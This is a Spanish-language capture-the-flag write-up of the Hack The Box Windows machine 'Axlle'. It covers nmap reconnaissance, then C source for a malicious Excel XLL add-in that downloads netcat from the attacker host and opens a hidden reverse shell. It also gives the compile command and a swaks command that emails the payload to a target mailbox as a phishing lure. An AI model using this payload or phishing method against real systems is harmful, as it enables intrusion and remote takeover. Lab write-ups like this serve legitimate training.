#ActiveDirectory #hard #windows 
### Ping

```python
❯ ping -c 1 10.10.11.21
PING 10.10.11.21 (10.10.11.21) 56(84) bytes of data.
64 bytes from 10.10.11.21: icmp_seq=1 ttl=127 time=151 ms

--- 10.10.11.21 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 151.127/151.127/151.127/0.000 ms
```

### TTL = 127 Windows

### nmap

```python
❯ sudo nmap -p- -open -sCV --min-rate 5000 -n -Pn 10.10.11.21 -oN Scan
[sudo] password for gleoq: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-27 19:21 EDT
Nmap scan report for 10.10.11.21
Host is up (0.15s latency).
Not shown: 65512 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
25/tcp    open  smtp          hMailServer smtpd
| smtp-commands: MAINFRAME, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Axlle Development
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-27 23:22:29Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: axlle.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: axlle.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-06-27T23:23:59+00:00; -3s from scanner time.
| ssl-cert: Subject: commonName=MAINFRAME.axlle.htb
| Not valid before: 2024-05-19T11:25:03
|_Not valid after:  2024-11-18T11:25:03
| rdp-ntlm-info: 
|   Target_Name: AXLLE
|   NetBIOS_Domain_Name: AXLLE
|   NetBIOS_Computer_Name: MAINFRAME
|   DNS_Domain_Name: axlle.htb
|   DNS_Computer_Name: MAINFRAME.axlle.htb
|   DNS_Tree_Name: axlle.htb
|   Product_Version: 10.0.20348
|_  System_Time: 2024-06-27T23:23:21+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49169/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49170/tcp open  msrpc         Microsoft Windows RPC
49175/tcp open  msrpc         Microsoft Windows RPC
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
52440/tcp open  msrpc         Microsoft Windows RPC
61423/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: MAINFRAME; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: -3s, deviation: 0s, median: -3s
| smb2-time: 
|   date: 2024-06-27T23:23:24
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 129.59 seconds
```

### Enumeración del puerto 80 (http)
parece que no podemos ver nada explotable en la web. así que vamos a seguir enumerando
![[Pasted image 20240627192751.png]]

parece que podemos hacer algún tipo de petición al correo `acconunts@axlle.htb` 
![[Pasted image 20240629111401.png]]

### DLL Hijacking
con este script en C vamos a intentar hacer una petición DLL

```python
#include <windows.h>
#include <urlmon.h>
#pragma comment(lib, "urlmon.lib")
__declspec(dllexport) short __stdcall xlAutoOpen()
{
HRESULT hr = URLDownloadToFileW(NULL, L"http://10.10.14.15:80/nc64.exe", L"C:\\Windows\\Tasks\\nc64.exe", 0,
NULL);
if (SUCCEEDED(hr)) {
WinExec("C:\\Windows\\Tasks\\nc64.exe -e cmd 10.10.14.15 443", SW_HIDE);
}
return 0;
}
```

### Compilamos el  dll con mingw-w64

```python
>	sudo apt install mingw-w64


>	x86_64-w64-mingw32-gcc -shared -o exploit.dll exploit.c -Wl,--output-def,exploit.def -lurlmon
```

### cambiamos la extensión del script

```python
>	mv exploit.dll exploit.xll
```

### Enviamos el XLL a accounts@axlle.htb vía SMTP

```python
swaks --to "accounts@axlle.htb" --from "gleoq@axlle.htb" --header "Subject: Open this exploit" --body "This is a picture of my girlfriend" --attach-type application/octet-stream --attach @exploit.xll --server axlle.htb --port 25 --timeout 20s
```

![[Pasted image 20240629113053.png]]

### Enumeración del sistema
abajo a la derecha podemos observar la terminal. de la maquina victima. he conseguido un archivo `xml` con información importante 
![[Pasted image 20240629114836.png]]










### Vulnerabilidades

| CVE-XXXX-XXXXX | Nombre de la vulnerabilidad | Tipo | Nivel | Link |
| -------------- | --------------------------- | ---- | ----- | ---- |
|                |                             |      |       |      |
|                |                             |      |       |      |
|                |                             |      |       |      |
